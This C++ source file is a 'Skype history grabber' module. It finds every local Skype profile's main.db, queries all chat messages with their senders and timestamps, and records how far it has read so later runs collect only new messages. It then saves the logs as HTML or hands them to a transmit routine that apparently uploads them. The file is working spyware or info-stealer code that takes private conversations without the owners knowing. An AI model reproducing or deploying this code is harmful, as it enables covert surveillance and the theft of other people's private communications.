/*
    Skype history grabber module;
    Grabs chatter history.

    Author: Kulverstukas
*/

#include <string>
#include <sqlite3.h>
#include <vector>
#include <algorithm>
#include <sys/stat.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <time.h>
#include "SkypeHistory.hpp"
#include "Structs.hpp"
#include "SendData.hpp"

using namespace std;

#define isBitSet(v, m) (((v) & (m)) == (m))

const string SKYPE_HISTORY = "main.db";
const string SKYPE_CONTROL_FILE = "scontrol.dat";
const string SKYPE_FOLDER = "\\Skype\\";
const string APP_DATA = "appdata";
const string SQL_QUERY = "SELECT convo_id, timestamp, from_dispname, author, body_xml FROM Messages WHERE (timestamp > %s) AND (body_xml NOT NULL) AND (body_xml NOT LIKE \"<partlist%%\") ORDER BY id asc, convo_id desc, timestamp asc";
string lastSkypeMillis = "0";
SkypeHistory sH;
ofstream newFile;
string prevID = "";
string skypeDataStr;
extern bool upload;

void SkypeHistory::readFile(bool argv, char* compName) {
    string sPath = (((string)getenv(APP_DATA.c_str()))+SKYPE_FOLDER);
    vector<SkypeProfiles> profiles;
    SendData sendData;
    upload = argv;
    probeFolders(sPath, &profiles);

    struct stat buff;
    int size = profiles.size();
    string controlF = "";
    sqlite3 *dbObj;
    for (int i = 0; i < size; i++) {
        int p = profiles[i].fullPath.find(SKYPE_HISTORY);
        controlF = profiles[i].fullPath;
        controlF.erase(p, SKYPE_HISTORY.size());
        controlF += SKYPE_CONTROL_FILE;     // replace main.db with control file name here
        if (stat(controlF.c_str(), &buff) != -1) {
            ifstream inF(controlF.c_str());
            if (inF.is_open() and inF.good()) {
                getline(inF, lastSkypeMillis);
            }
            inF.close();
        }

        // this call will fail on Win7 when Skype is open and current user is logged on.
        // Seems to work on XP though. It will grab the users that are not logged on currently.
        int k = sqlite3_open_v2(profiles[i].fullPath.c_str(), &dbObj, SQLITE_OPEN_READONLY, NULL);
        if(k == SQLITE_OK) {
            if (!upload) {
                newFile.open((profiles[i].profileName+".html").c_str(), ios::app);
                newFile << "<style type=\"text/css\">body {font-family:\"lucida console\";font-size:11px}</style><body>" << endl;
            } else {
                skypeDataStr.append("<style type=\"text/css\">body {font-family:\"lucida console\";font-size:11px}</style><body>\n");
            }
            char sQuery[210];
            sprintf(sQuery, SQL_QUERY.c_str(), lastSkypeMillis.c_str());
            sqlite3_exec(dbObj, sQuery, grabSkypeDataCallback, NULL, NULL);

            ofstream outF(controlF.c_str());
            if (outF.is_open() and outF.good()) {
                outF << lastSkypeMillis << endl;
                //outF << 0 << endl;
            }
            outF.close();
            if (upload) {
                skypeDataStr.append("============================================================</body>\n");
                sendData.transmit("Skype", compName, profiles[i].profileName, skypeDataStr);
            } else {
                newFile << "============================================================</body>" << endl;
                newFile.close();
            }
        }
        sqlite3_close_v2(dbObj);
        prevID = "";
        lastSkypeMillis = "0";
    }
}

int grabSkypeDataCallback(void *NotUsed, int argc, char **argv, char **azColName) {
    if (upload) {
        if (argv[0] != prevID) {
            skypeDataStr.append("============================================================<br />\n");
        }
        skypeDataStr.append("["+sH.convertMillisToDatetime(atol(argv[1]))+"] ");
        skypeDataStr.append(((string)(argv[2] ? argv[2] : "EMPTY"))+" (");
        skypeDataStr.append(((string)(argv[3] ? argv[3] : "EMPTY"))+"): ");
        skypeDataStr.append(argv[4] ? argv[4] : "EMPTY");
        skypeDataStr.append("<br />\n");
    } else {
        if (argv[0] != prevID) { newFile << "============================================================<br />" << endl; }
        newFile << "["+sH.convertMillisToDatetime(atol(argv[1]))+"] "
                << ((string)(argv[2] ? argv[2] : "EMPTY"))+" ("
                << ((string)(argv[3] ? argv[3] : "EMPTY"))+"): "
                << (argv[4] ? argv[4] : "EMPTY") << "<br />" << endl;
    }
    prevID = argv[0];
    lastSkypeMillis = argv[1];

    return 0;
}

string SkypeHistory::convertMillisToDatetime(long int millis) {
    time_t rawtime = millis;
    struct tm *convertedTime = localtime(&rawtime);
    char result[22];
    strftime(result, 22, "%Y.%m.%d, %X", convertedTime);
    return (string)result;
}

void SkypeHistory::probeFolders(string path, vector<SkypeProfiles>* profiles) {
    WIN32_FIND_DATA findData;
    HANDLE h = FindFirstFile((path+"*").c_str(), &findData);
    struct stat buff;
    struct SkypeProfiles sProfiles;
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (isBitSet(findData.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY)
            and (strcmp(findData.cFileName, ".") != 0)
            and (strcmp(findData.cFileName, "..") != 0)) {
//                cout << findData.cFileName << endl;
                if (stat((path+findData.cFileName+"\\"+SKYPE_HISTORY).c_str(), &buff) != -1) {
//                    cout << findData.cFileName << endl;
                    sProfiles.fullPath = path+findData.cFileName+"\\"+SKYPE_HISTORY;
                    sProfiles.profileName = findData.cFileName;
                    profiles->push_back(sProfiles);
//                    cout << sProfiles.fullPath << endl;
                }
            }
        } while (FindNextFile(h, &findData));
    }
    FindClose(h);
}
